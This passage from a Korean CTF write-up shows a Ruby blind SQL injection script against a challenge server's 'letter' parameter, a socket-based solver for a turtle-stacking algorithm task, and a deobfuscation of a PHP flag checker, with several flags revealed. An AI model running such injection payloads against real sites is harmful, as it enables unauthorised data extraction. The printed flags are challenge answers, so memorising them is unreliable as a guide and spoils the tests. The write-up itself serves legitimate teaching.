<span class="p">...</span>
</code></pre></div></div><p>길이는 10글자입니다. 문제는 글의 내용인데요, <code class="highlighter-rouge">"%A%"</code> 등의 알파벳이 존재하지 않습니다. 처음 등장한 Clue에서 <code class="highlighter-rouge">utf32_unicode_ci</code>라는 부분을 생각하면 글이 한글로 이루어져 있는 것 같습니다. 마찬가지로 like를 이용해 한글 글자를 빼냅니다.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'net/http'</span>

<span class="p">(</span><span class="s1">'가'</span><span class="o">..</span><span class="s1">'힣'</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">char</span><span class="o">|</span>
  <span class="nb">puts</span> <span class="n">char</span> <span class="k">if</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="no">URI</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s2">"http://web-prob.dkserver.wo.tc/sqli_962a035aacf08966ffc7610957ac0c29/?letter=-1%20or%20letter%20like%20%27</span><span class="si">#{</span><span class="no">URI</span><span class="p">.</span><span class="nf">escape</span><span class="p">(</span><span class="s2">"%</span><span class="si">#{</span><span class="n">char</span><span class="si">}</span><span class="s2">%"</span><span class="p">)</span><span class="si">}</span><span class="s2">%27%20and%20no=4"</span><span class="p">)).</span><span class="nf">body</span><span class="p">.</span><span class="nf">force_encoding</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="o">=~</span> <span class="sr">/Secret/</span>
<span class="k">end</span>
</code></pre></div></div><p>끝까지 돌렸다면 아마 아래와 같은 결과가 나왔을 것입니다만, 다 나오기 전에 추측했습니다.</p><div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>그
날
는
라
래
리
아
야
오
플
</code></pre></div></div><p>각 글자의 자리는 <code class="highlighter-rouge">__________</code>의 각 글자 중 한 자리에 넣어봄으로써 알아냈습니다. 글 내용은 <code class="highlighter-rouge">플래그는오리야날아라</code>였습니다.</p><p>Flag는 <code class="highlighter-rouge">오리야날아라</code>입니다.</p><h2 id="weight-and-measures">WEIGHT AND MEASURES - ALGO200</h2><blockquote><p>밤(bam)이라는 검은 거북이가 친구들과 햄버거놀이를 하기 위해 문의를 해왔다. 혹시 놀이를 하다가 다칠 수도 있기 때문이다. 햄버거놀이를 하기 위해 동원된 거북이는 체중과 체력이 모두 다르다. 가능한 한 가장 많은 거북이를 쌓는 방법을 찾아보자.</p><p>[+] Notice : 여러 줄이 입력되는데, 한 줄에 한 쌍의 정수가 입력된다. 첫번째 정수는 체중을, 두번째 정수는 거북이의 체력을 나타낸다. 거북이의 체중은 그램 단위로 입력된다. 즉 체중이 600g이고 체력이 1500인 거북이의 등 위에는 900g을 올려놓을 수 있다.</p><p>[+] Notice : 어떤 거북이도 자기 체력이 허용하는 한도 내에서만 등 위에 다른 거북이를 올려놓으면서, 몇 마리의 거북이를 쌓을 수 있는지를 나타내는 정수를 출력한다.</p><p>3초 안에 계산해서 제출해야 한다. 제출 방식은 쌓을 수 있는 거북이의 숫자 turtles로 제출하면 된다.</p><p>[+] examples</p><p>거북이 = 4마리</p><p>No.1</p><p>1300</p><p>1710</p><p>No.2</p><p>100</p><p>1350</p><p>No.3</p><p>1000</p><p>1550</p><p>No.4</p><p>600</p><p>990</p><p>Answer = 2 turtles</p><p>Server: prob2.christmasctf.com 4941 (괄호안에 있는 답만 인증해주세요)</p></blockquote><p>다른 알고리즘 문제와 마찬가지로 해답을 코딩하면 됩니다.</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'socket'</span>

<span class="k">def</span> <span class="nf">answer</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">acc</span><span class="p">,</span> <span class="n">turtles</span><span class="p">)</span>
  <span class="k">return</span> <span class="p">[</span><span class="n">count</span><span class="p">,</span> <span class="n">acc</span><span class="p">]</span> <span class="k">if</span> <span class="n">turtles</span><span class="p">.</span><span class="nf">empty?</span>
  <span class="k">return</span> <span class="p">[</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">acc</span> <span class="o">+</span> <span class="n">turtles</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]]</span> <span class="k">if</span> <span class="n">turtles</span><span class="p">.</span><span class="nf">size</span> <span class="o">==</span> <span class="mi">1</span>
  <span class="n">turtles</span><span class="p">.</span><span class="nf">map</span><span class="p">.</span><span class="nf">with_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">turtle</span><span class="p">,</span> <span class="n">i</span><span class="o">|</span>
    <span class="n">remain</span> <span class="o">=</span> <span class="n">turtles</span><span class="p">[</span><span class="mi">0</span><span class="o">...</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">turtles</span><span class="p">[(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span><span class="o">...</span><span class="n">turtles</span><span class="p">.</span><span class="nf">size</span><span class="p">]</span>
    <span class="n">answer</span><span class="p">(</span><span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">acc</span> <span class="o">+</span> <span class="n">turtle</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">remain</span><span class="p">.</span><span class="nf">select</span> <span class="p">{</span> <span class="o">|</span><span class="n">v</span><span class="o">|</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">acc</span> <span class="o">+</span> <span class="n">turtle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">})</span>
  <span class="k">end</span><span class="p">.</span><span class="nf">max_by</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:first</span><span class="p">)</span>
<span class="k">end</span>

<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'prob2.christmasctf.com'</span><span class="p">,</span> <span class="mi">4941</span><span class="p">)</span>
<span class="c1"># Instruction</span>
<span class="nb">puts</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">65535</span><span class="p">)</span>

<span class="kp">loop</span> <span class="k">do</span>
  <span class="nb">print</span> <span class="n">input</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">65535</span><span class="p">)</span>
  <span class="n">turtle_count</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
  <span class="n">turtles</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="n">lines</span> <span class="o">=</span> <span class="n">input</span><span class="p">.</span><span class="nf">lines</span>
  <span class="n">lines</span><span class="p">.</span><span class="nf">shift</span> <span class="k">until</span> <span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">/round/</span>
  <span class="k">while</span> <span class="n">turtle_count</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="n">turtles</span><span class="p">.</span><span class="nf">size</span> <span class="o">&lt;</span> <span class="n">turtle_count</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">lines</span><span class="p">.</span><span class="nf">shift</span>
    <span class="k">if</span> <span class="n">line</span><span class="p">.</span><span class="nf">nil?</span>
      <span class="nb">print</span> <span class="n">input</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">65535</span><span class="p">)</span>
      <span class="n">lines</span> <span class="o">=</span> <span class="n">input</span><span class="p">.</span><span class="nf">lines</span>
      <span class="n">line</span> <span class="o">=</span> <span class="n">lines</span><span class="p">.</span><span class="nf">shift</span>
    <span class="k">end</span>
    <span class="n">turtle_count</span> <span class="o">=</span> <span class="vg">$1</span><span class="p">.</span><span class="nf">to_i</span> <span class="k">if</span> <span class="n">line</span><span class="p">.</span><span class="nf">force_encoding</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="o">=~</span> <span class="sr">/^거북이\s*=\s*(\d+)/</span>
    <span class="k">if</span> <span class="n">line</span> <span class="o">=~</span> <span class="sr">/^No\./</span>
      <span class="n">weight</span> <span class="o">=</span> <span class="n">lines</span><span class="p">.</span><span class="nf">shift</span><span class="p">.</span><span class="nf">to_i</span>
      <span class="n">measure</span> <span class="o">=</span> <span class="n">lines</span><span class="p">.</span><span class="nf">shift</span><span class="p">.</span><span class="nf">to_i</span>
      <span class="n">turtles</span> <span class="o">&lt;&lt;</span> <span class="p">[</span><span class="n">weight</span><span class="p">,</span> <span class="n">measure</span><span class="p">,</span> <span class="n">measure</span> <span class="o">-</span> <span class="n">weight</span><span class="p">]</span>
    <span class="k">end</span>
  <span class="k">end</span>

  <span class="nb">puts</span> <span class="n">message</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">answer</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">turtles</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> turtles"</span>
  <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="k">end</span>
</code></pre></div></div><p>20문제를 풀게 되면 다음과 같은 메시지를 받을 수 있습니다.</p><div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Congratz! You are Dynamic algorithm master
The Flag is christmas{Rac_reKrei$her_!s_so_cute_@lligat0r!}
</code></pre></div></div><p>Flag는 <code class="highlighter-rouge">Rac_reKrei$her_!s_so_cute_@lligat0r!</code>입니다.</p><h2 id="php-obfuscate">PHP Obfuscate - WEB500</h2><blockquote><p>PHP Version 5.2.12에서 테스트했습니다</p><p>의도하지 않은 풀이가 존재할 경우에 christmasctf@gmail.com 로 메일을 보내주세요!</p><p>답 처리 해드립니다 :)</p><p><a href="http://goo.gl/ml28eF">http://goo.gl/ml28eF</a></p></blockquote><p>위 링크에 접근이 되지 않는다면 <a href="/downloads/2014/12/26/phpobfuscate_6edfd44ed0290d72e6b9a59f256e8dc0.zip">이 링크</a>를 사용해주시기 바랍니다.</p><p>압축을 풀면 난독화된 <code class="highlighter-rouge">index.php</code>가 나옵니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="c1">////////////////////////</span>
<span class="c1">//          stage1         //</span>
<span class="c1">////////////////////////</span>

<span class="nv">$á</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$$a</span><span class="o">=~</span><span class="nv">$á</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="nv">$a</span><span class="o">+=</span><span class="nv">$$a</span><span class="o">*</span><span class="nv">$$a</span><span class="p">;</span>
<span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">=~</span><span class="nv">$a</span><span class="o">*-</span><span class="mi">1</span><span class="o">^</span><span class="nv">$a</span><span class="p">;</span>
<span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">=~</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">*-</span><span class="mi">1</span><span class="p">;</span>
<span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">*=</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">*</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
<span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">+=</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">^</span><span class="mi">4</span><span class="p">;</span>
<span class="nv">$á</span><span class="p">[</span><span class="nx">â</span><span class="p">]</span><span class="o">=</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">/</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">];</span>
<span class="nv">$à</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">];</span>
<span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">*=</span><span class="nv">$a</span><span class="o">+</span><span class="nv">$a</span><span class="p">;</span>
<span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">-=</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">^</span><span class="nv">$á</span><span class="p">[</span><span class="nx">â</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$à</span><span class="p">[</span><span class="nv">$a</span><span class="o">^</span><span class="nv">$a</span><span class="p">])</span><span class="o">-</span><span class="nv">$a</span><span class="o">!=</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span><span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">-=</span><span class="nv">$á</span><span class="p">[</span><span class="nx">â</span><span class="p">]</span><span class="o">-</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">];</span>
<span class="k">if</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$à</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span><span class="o">-</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">!=</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">-</span><span class="nv">$a</span><span class="p">))</span><span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$á</span><span class="p">[</span><span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">])]</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">*</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$á</span><span class="p">)))</span><span class="o">*</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">-</span><span class="nv">$a</span> <span class="o">!=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$à</span><span class="p">[</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">-</span><span class="nv">$a</span><span class="p">]))</span><span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$á</span><span class="p">[</span><span class="nb">round</span><span class="p">(</span><span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">*</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$á</span><span class="p">)))</span><span class="o">*</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]]</span> <span class="o">=</span> <span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]);</span>
<span class="k">if</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$à</span><span class="p">[</span><span class="nb">pow</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nb">round</span><span class="p">(</span><span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">*</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$á</span><span class="p">)))</span><span class="o">*</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]],</span><span class="nv">$á</span><span class="p">[</span><span class="nb">round</span><span class="p">(</span><span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">*</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$á</span><span class="p">)))</span><span class="o">*</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]])])</span><span class="o">+</span><span class="nv">$a</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="o">+</span><span class="nv">$a</span><span class="p">]</span><span class="o">*</span><span class="p">((</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="nv">$a</span><span class="o">+</span><span class="nv">$a</span><span class="p">)</span><span class="o">+</span><span class="nv">$a</span><span class="p">)</span><span class="o">/</span><span class="p">(</span><span class="nv">$a</span><span class="o">+</span><span class="nv">$á</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span><span class="o">+</span><span class="nv">$a</span><span class="p">)))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$á</span><span class="p">[</span><span class="nv">$$a</span><span class="p">]</span><span class="o">=</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$à</span><span class="p">[</span><span class="nv">$$a</span><span class="p">])</span><span class="o">-</span><span class="nv">$á</span><span class="p">[</span><span class="nx">â</span><span class="p">]</span><span class="o">+</span><span class="nv">$a</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$$a</span><span class="p">]</span><span class="o">+</span><span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$$a</span><span class="p">])</span><span class="o">-</span><span class="nv">$a</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$à</span><span class="p">[</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">-</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$$a</span><span class="p">]])</span><span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>


<span class="nv">$flag_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">7</span><span class="p">,</span>
    <span class="mi">111</span><span class="p">,</span>
    <span class="mi">95</span><span class="p">,</span>			<span class="cm">/*
    114,			*        this is stage2 of challenge.
    117,			*          i think this stage is easy,
    98,			*  but you should read code deliberately
    105,			*     i hope you enjoy ctf and have fun.
    121,			*               from your friend
    97,			*                     rubiya
    95,			*/</span>
    <span class="mi">100</span><span class="p">,</span>
    <span class="mo">060</span>
<span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nv">$a</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$flag_array</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span> <span class="nv">$flag_array</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$flag_array</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span> <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$count</span><span class="o">=</span><span class="mi">5</span><span class="p">;</span><span class="nv">$count</span><span class="o">&lt;</span><span class="nb">sqrt</span><span class="p">(</span><span class="nv">$á</span><span class="p">[</span><span class="nv">$$a</span><span class="p">]);</span><span class="nv">$count</span><span class="o">++</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">][</span><span class="nv">$count</span><span class="p">]</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">fIag</span><span class="p">][</span><span class="nv">$count</span><span class="o">-</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$flag_array</span><span class="p">[</span><span class="nv">$count</span><span class="o">-</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">fIag</span><span class="p">][</span><span class="nv">$count</span><span class="o">-</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$flag_len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]);</span>
    <span class="nv">$length_chk</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="nv">$flag_len</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="nv">$length_chk</span> <span class="o">+=</span> <span class="nv">$flag_len</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span><span class="p">((</span><span class="nv">$length_chk</span> <span class="o">&lt;</span> <span class="mi">110</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$length_chk</span> <span class="o">&gt;</span> <span class="mi">130</span><span class="p">))</span><span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
    <span class="nv">$stage3</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">],</span><span class="o">-</span><span class="mi">7</span><span class="p">);</span>
    <span class="nv">$stage3_1</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$stage3</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
    <span class="nv">$stage3_2</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$stage3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">"stage3_"</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$stage3_1</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$stage3_2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">!=</span> <span class="s2">"stage3_143193195211162158"</span><span class="p">)</span><span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"You did it!&lt;br&gt;Flag is {&lt;strong&gt;"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"&lt;/strong&gt;}"</span><span class="p">;</span>

<span class="cp">?&gt;</span>
</code></pre></div></div><p>동일한 동작을 위해 최대한 비슷한 PHP 버전에서 시도해야 합니다. <a href="http://sandbox.onlinephpfunctions.com/">Online PHP Functions의 PHP Sandbox</a>에서 PHP 5.2.16 환경으로 작업했습니다.</p><p>일단 라틴 알파벳들은 보기 쉬운 알파벳들로 바꾸고, 계산 작업을 수행해 줍니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$_a</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
<span class="nv">$_a</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">116</span><span class="p">)</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$_a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">102</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">105</span><span class="p">)</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$_a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="mi">101</span> <span class="o">!=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="mi">3</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$_a</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">95</span><span class="p">)</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="nv">$_a</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span> <span class="o">!=</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
</code></pre></div></div><p>간단히 <code class="highlighter-rouge">$_GET[flag]</code>의 앞 글자 다섯 자리가 <code class="highlighter-rouge">time_</code>이라는 것을 알아낼 수 있습니다.</p><p><code class="highlighter-rouge">$flag_array</code>의 경우 주석 때문에 가운데 영역이 주석 처리됩니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$flag_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">7</span><span class="p">,</span>
    <span class="mi">111</span><span class="p">,</span>
    <span class="mi">95</span><span class="p">,</span>
    <span class="mi">100</span><span class="p">,</span>
    <span class="mo">060</span>
<span class="p">);</span>
</code></pre></div></div><p>첫 번째 <code class="highlighter-rouge">for</code> 문은 한 줄로 끝나는 것으로, 다음 줄부터는 들여 쓰는 것이 아닙니다. <code class="highlighter-rouge">$i</code>도 <code class="highlighter-rouge">for</code> 문이 끝났으므로 <code class="highlighter-rouge">5</code>로 값이 고정되어 있습니다. 또한 <code class="highlighter-rouge">$_GET[flag]</code>가 아닌 <code class="highlighter-rouge">$_GET[fIag]</code>가 있는 것에 주의하시기 바랍니다.</p><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$flag_array</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$flag_array</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$flag_array</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span> <span class="p">}</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span> <span class="nv">$count</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="nv">$count</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">flag</span><span class="p">][</span><span class="nv">$count</span><span class="p">]</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">fIag</span><span class="p">][</span><span class="nv">$count</span> <span class="o">-</span> <span class="mi">5</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$flag_array</span><span class="p">[</span><span class="nv">$count</span> <span class="o">-</span> <span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">fIag</span><span class="p">][</span><span class="nv">$count</span> <span class="o">-</span> <span class="mi">4</span><span class="p">])</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"wrong"</span><span class="p">);</span>
<span class="p">}</span>
